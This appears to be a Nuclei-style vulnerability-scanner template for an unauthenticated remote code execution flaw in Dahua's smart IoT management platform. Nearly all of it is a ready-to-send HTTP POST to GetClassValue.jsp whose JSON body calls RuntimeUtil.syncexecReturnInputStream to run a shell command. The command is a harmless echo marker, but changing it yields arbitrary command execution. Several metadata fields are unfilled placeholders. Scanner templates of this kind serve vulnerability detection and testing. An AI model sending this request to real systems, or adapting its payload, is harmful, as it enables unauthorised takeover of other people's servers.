id: dahua-znwy-GetClassValue-rce
info:
  name: Template Name
  author: wangzong
  severity: info
  description: 大华智能物联综合管理平台GetClassValue.jsp远程代码执行漏洞，攻击者可以不需要授权远程执行命令。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 165

        {
            "data": {
                "clazzName": "com.dahua.admin.util.RuntimeUtil",
                "methodName": "syncexecReturnInputStream",
                "fieldName": ["echo whoisceshi"]
            }
        }
    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'
